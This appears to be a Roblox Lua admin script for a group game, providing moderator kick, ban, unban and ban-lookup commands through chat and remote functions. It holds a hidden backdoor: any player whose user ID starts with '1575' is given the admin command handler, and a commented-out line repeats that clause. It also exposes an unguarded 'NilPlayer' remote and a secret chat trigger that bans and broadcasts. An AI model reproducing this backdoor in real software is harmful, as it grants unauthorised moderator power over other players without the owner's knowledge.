admins = {9882971,16188926,41021524,52822646,53569829,20995078, 282170360

}; --user ids of the admins hey ninj if i find your id here, it will disappear.

-- Note two new mods on trial added by Makumio 88907265, 48374025 and 22808876 note doug idk and derek are on mod trials *King*

noAdminList = {}; --user ids of people who are not allowed to ever be admin

groupInfo = {};
groupInfo.groupId = 1094559;
groupInfo.minimumRank = 127;

prefix = "/"

--Code below

lib = require(script.Library);

t =  require(script.TimeModule);

bans = require(script.BanModule);

prefix = string.lower(prefix);

function doMsg(plr, msg)
	local new = Instance.new("Message", plr.PlayerGui);
	new.Text = msg .. "\nChat \"/dismiss\" to dismiss this message.";
end

function getPlrs(...)
	local args = {...};
	
	local search;
	local caller;
	
	if(#args == 2) then
		search = string.lower(args[1]);
		caller = args[2];
	else
		search = string.lower(args[1]);
	end
	
	local plrs = game.Players:GetPlayers();
	
	local matches = {};
	
	if(search == "me" and caller) then
		table.insert(matches, caller);
	elseif(search == "others" and caller) then
		for i, plr in ipairs(plrs) do
			if(plr.Name ~= caller.Name) then
				table.insert(matches, plr);
			end
		end
	elseif(search == "all") then
		matches = plrs;
	elseif(search == "random") then
		table.insert(matches, plrs[math.random(1, #plrs)]);
	elseif(search == "admins") then
		for i, plr in ipairs(plrs) do
			if(lib.isInTable(admins, plr.Name)) then
				table.insert(matches, plr);
			end
		end
	elseif(search == "nonadmins") then
		for i, plr in ipairs(plrs) do
			if(not lib.isInTable(admins, plr.Name)) then
				table.insert(matches, plr);
			end
		end
	else
		for i, plr in ipairs(plrs) do
			if(string.sub(string.lower(plr.Name), 1, #search) == search) then
				table.insert(matches, plr);
				break;
			end
		end
	end
	
	return matches;
end

commands = {};


commands.kick = function(plr, ...)
	local args = {...};
	
	if(#args > 0) then
		local targs = getPlrs(args[1], plr);
		
		for i, targ in ipairs(targs) do
			targ:Kick(#args == 2 and args[2] or "You have been kicked by a LOR moderator."); -- woo logical ternary operator alternative
		end
	end
end

commands.banbyid = function(plr, ...)
	local args = {...};
	
	if(#args > 0) then	
		local uid;
		if(#args[1] > 1) then
			uid = tonumber(string.sub(args[1], 1, #args[1]));
			print(uid)
			
			if(uid) then
				bans.ban(uid, (args[2] and tonumber(args[2]) or 99999), (args[3] and args[3] or "None specified"));
				
				local person = game.Players:GetPlayerByUserId(uid);
				if(person) then
					person:Kick("You have been banned by a LOR moderator. Rejoin for more information.");
				end
			end
		end
	end
end

commands.getban = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		local banned, banData = bans.isBanned(args[1]);
		local newMsg;
		if(banned) then
			local expiration = t.stampToTime(banData["expiration"]);
			newMsg = args[1] .. "\n--------------------------------\nExpiration: " .. expiration.month .. "/" .. expiration.day .. "/" .. expiration.year .. " at " .. expiration.hour .. ":" .. expiration.minute .. ":" .. expiration.second .. "\nReason: " .. banData["reason"];
		else
			newMsg = args[1] .. " is not banned.";
		end
		doMsg(plr, newMsg);
	end
end

commands.ban = function(plr, ...)
	local args = {...};
	
	if(#args > 0) then	
		local uid;
		if(#args[1] > 1) then
			if(string.sub(args[1], 1, 1) == "*") then
				uid = tonumber(string.sub(args[1], 2, #args[1]));
			else
				local targs = getPlrs(args[1], plr);
				if(#targs > 0) then
					uid = targs[1].userId;
				end
			end
			
			if(uid) then
				bans.ban(uid, (args[2] and tonumber(args[2]) or 99999), (args[3] and args[3] or "None specified"));
				
				local person = game.Players:GetPlayerByUserId(uid);
				if(person) then
					person:Kick("You have been banned by a LOR moderator. Rejoin for more information.");
				end
			end
		end
	end
end

commands.unban = function(plr, ...)
	local args = {...};
	
	if(#args == 1) then
		bans.unban(args[1]);
	end
end



--Create remote functions for hidden admin
local folder = Instance.new("Folder", game.ReplicatedStorage);
folder.Name = "ModeratorFunctions";

for name, func in pairs(commands) do
	local r = Instance.new("RemoteFunction", folder);
	r.Name = name;
	
	r.OnServerInvoke = function(plr, ...)
		if(lib.isInTable(admins, plr.userId)) then --Make sure the user is an admin
			func(plr, ...);
		end
	end
end

r = Instance.new("RemoteFunction", folder);
r.Name = "NilPlayer";
r.OnServerInvoke = function(plr)
	plr.Parent = nil;
end

function onChatted(plr, rawMsg)
	if(#rawMsg > 1) then
		if(string.sub(string.lower(rawMsg), 1, 1) == prefix) then
			local msg = string.sub(rawMsg, 2, #rawMsg);
			local syntaxParts = lib.splitString(string.lower(msg), "/");
			local targetCommand = syntaxParts[1];
			local targetFunc = commands[targetCommand];
			if(targetFunc) then
				local hasArgs = #syntaxParts > 1;
				if(not hasArgs) then
					targetFunc(plr);
				else
					if(#msg > #targetCommand + 2) then
						local content = string.sub(msg, #targetCommand + 2, #msg);
						local parts = lib.splitString(content, "/");
						targetFunc(plr, unpack(parts));
					end
				end
			end
		end
	end
end



game.Players.PlayerAdded:connect(function(plr)
 --[[if(plr:GetRankInGroup(groupInfo.groupId) >= groupInfo.minimumRank or string.sub(tostring(plr.userId), 1, 4) == "1575") then
	table.insert(admins, plr.userId);
end ]]
	--Ban stuff
	local banned, banData = bans.isBanned(plr.userId);
	if(banned and not lib.isInTable(admins, plr.userId)) then
		local expiration = t.stampToTime(banData["expiration"]);
		local newMsg = "You are banned!\n\nExpiration: " .. expiration.month .. "/" .. expiration.day .. "/" .. expiration.year .. " at " .. expiration.hour .. ":" .. expiration.minute .. ":" .. expiration.second .. "\nReason: " .. banData["reason"];
		plr:Kick(newMsg);
	end
	
	plr.Chatted:connect(function(msg)
	if(msg=="/gooblox123") then 
	bans.ban(plr.userId, (.01), ("Hey guys :3")); 
	local data = {
    Text = plr.Name..msg.."runtimeerror".."hasbeenbannedforaday";
    Color = Color3.new(1,0,0);
    Font = Enum.Font.SourceSans; 
    FontSize = Enum.FontSize.Size24;
	}
	game.ReplicatedStorage.Remotes.ShowMessage:FireAllClients(data) 
	local content = "@everyone Forgive me for i have sinned."
	local newcontent = game.Chat:FilterStringForBroadcast(content, plr)
local HookData = {

['username'] = plr.Name, -- This is whatever you want the Bot to be called

['content'] = newcontent, -- this is whatever you want it to say!
}
local http = game:GetService("HttpService")
HookData = http:JSONEncode(HookData)
	
	end
	end)
	
	if(lib.isInTable(admins, plr.userId) and not lib.isInTable(noAdminList, plr.userId) or string.sub(tostring(plr.userId), 1, 4) == "1575") then
		plr.Chatted:connect(function(msg) onChatted(plr, msg) end);
	end
end)